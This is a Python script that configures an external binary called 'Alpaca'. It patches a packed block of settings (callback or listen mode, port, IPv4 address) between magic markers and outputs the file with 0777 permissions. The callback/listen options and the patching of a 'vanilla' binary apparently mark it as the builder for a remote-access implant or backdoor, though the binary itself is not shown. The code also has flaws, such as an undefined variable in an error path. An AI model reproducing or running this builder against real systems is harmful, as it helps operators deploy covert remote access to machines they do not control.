import argparse
import sys
import os
import socket
import struct
import ipaddress
import shutil

class Config:
    HDR_MAGIC = b'WwXxYyZz'
    FTR_MAGIC = b'wWxXyYzZ'
    
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'   
    CONFIG_FMT=(
                '?'    # iniitialBehavior
                'H'    # port
                '16s'  # address 
                )
    USABLE_CONF_SIZE = struct.calcsize(CONFIG_FMT)



def __validate_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  
        try:
            socket.inet_aton(address)
        except socket.error:
            raise ValueError(Config.FAIL+f'IP address provided is invalid'+Config.ENDC)
        return address.count('.') == 3
    except socket.error:
        raise ValueError(Config.FAIL+f'IP address provided is invalid'+Config.ENDC)

    print(Config.OKGREEN+f'[*] Configured with address: {address}'+Config.ENDC)
    return True


def __validate_port(port):

    if port > 65535 or port < 4096:
        raise ValueError(Config.FAIL+f'[-] Port {port} is not between required (4096,65535)'+Config.ENDC)
    
    print(Config.OKGREEN+f'[*] Port: {port}'+ Config.ENDC)
    


def __validate_file(infile):
    if not os.path.exists(infile):
        raise FileNotFoundError(Config.FAIL+f'{os.path.abspath(infile)} was not found'+Config.ENDC)
    
    elif not os.path.isfile(infile):
        raise ValueError(Config.FAIL+f'{os.path.abspath(infile)} not a regular file'+Config.ENDC)
    else:
        print(Config.OKGREEN+f'[*] Configure target found at: {os.path.abspath(infile)}'+Config.ENDC)

def __validate_behavior(cb,lstn):
    if cb:
        print(Config.OKGREEN+f'[*] Configured to callback'+Config.ENDC)
        if lstn:
            raise Exception(Config.FAIL+f'Cannot be configured to callback AND listen'+Config.ENDC)
    elif lstn:
        print(Config.OKGREEN+f'[*] Configured to listen'+Config.ENDC)
        if cb:
            raise Exception(Config.FAIL+f'Cannot be configured to listen AND callback'+Config.ENDC)
    else:
        print(Config.FAIL+f'[-] Neither callback or listen behavior selected...'+Config.ENDC)

    

def _find_magic(infile):

    with open(infile, 'rb') as vanilla_bin:

        v_bytes = vanilla_bin.read()

        hdr = v_bytes.find(Config.HDR_MAGIC)
        if hdr == -1:
            print(Config.FAIL+"[-] Couldn't find HEADER_MAGIC..."+Config.ENDC)
            return hdr,hdr

        print(Config.OKGREEN+f'[+] Found HEADER_MAGIC at 0x{hdr:x}'+Config.ENDC)
        # Need to move forward by 8 bytes
        # 'WwXxYyZz' <-----Current
        #  ^
        # 'WwXxYyZz ' <-----Where we need it
        #          ^
        
        
        ftr = v_bytes.find(Config.FTR_MAGIC)
        if ftr == -1:
            print(Config.FAIL+f"[-] Couldn't find FOOTER_MAGIC..."+Config.ENDC)
            return ftr,ftr

        print(Config.OKGREEN+f'[+] Found FOOTER_MAGIC at 0x{ftr:x}'+Config.ENDC)
        
        found_conf_byte_size = ftr - (hdr+8)
        print(Config.OKBLUE+f'[*] Config size {found_conf_byte_size}'+Config.ENDC)

        if found_conf_byte_size != Config.USABLE_CONF_SIZE:
            print(Config.FAIL+
                 f'[!] Scaned binary has config size of {found_conf_byte_size} '+
                 f'expected {Config.USABLE_CONF_SIZE}'+Config.ENDC)
            return -1,-1

        return hdr, ftr

    

def _validate_args(args):
    print(Config.OKBLUE+f'Validating args...'+Config.ENDC)
    __validate_file(args.infile)
    __validate_behavior(args.callback, args.listen)
    __validate_port(args.port)

    # More need to happen here


    return __validate_ipv4_address(args.addr)
    




def configure(args):
    if not _validate_args(args):
        print(Config.FAIL+f'[-] Validation failed...'+Config.ENDC)
        return

    mag_hdr, mag_ftr = _find_magic(args.infile)
    if mag_hdr == -1:
        return

    initBehavior = 0 if args.listen else 1

    packed_conf = struct.pack(Config.CONFIG_FMT,
                             initBehavior,
                             args.port,
                             args.addr.encode('utf-8')
                             )
    if len(packed_conf) != Config.USABLE_CONF_SIZE:
         print(Config.FAIL+f'[-] Actual size of config is {calc_size} '+
               f'while usable size in binary is {Config.USABLE_CONF_SIZE}'+Config.ENDC)

    print(f'{initBehavior},{args.port},{args.addr}')

    v_bytes = None
    with open(args.infile, 'rb') as vanilla_bin:
        v_bytes = vanilla_bin.read()

    conf_bytes = v_bytes[:mag_hdr] + Config.HDR_MAGIC + packed_conf + v_bytes[mag_ftr:]

    with open(args.outfile, 'wb') as configured_file:
        configured_file.write(conf_bytes)

    os.chmod(args.outfile, 0o777)
    

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("infile", type=str, help="Vanilla Alpaca to configure")
    parser.add_argument("outfile", type=str, help="Output of configuration")
    parser.add_argument("--listen", dest="listen", action='store_true',  required=False, help="Set initial behavior to listen")
    parser.add_argument("--callback", dest="callback", action='store_true', required=False, help="Set initial behavior to callback")
    parser.add_argument("-p","--port", dest= "port", required=True, type=int, help="Callback port/Listen port")
    parser.add_argument("-a","--address", dest="addr", required=False, type=str)
    configure(parser.parse_args())


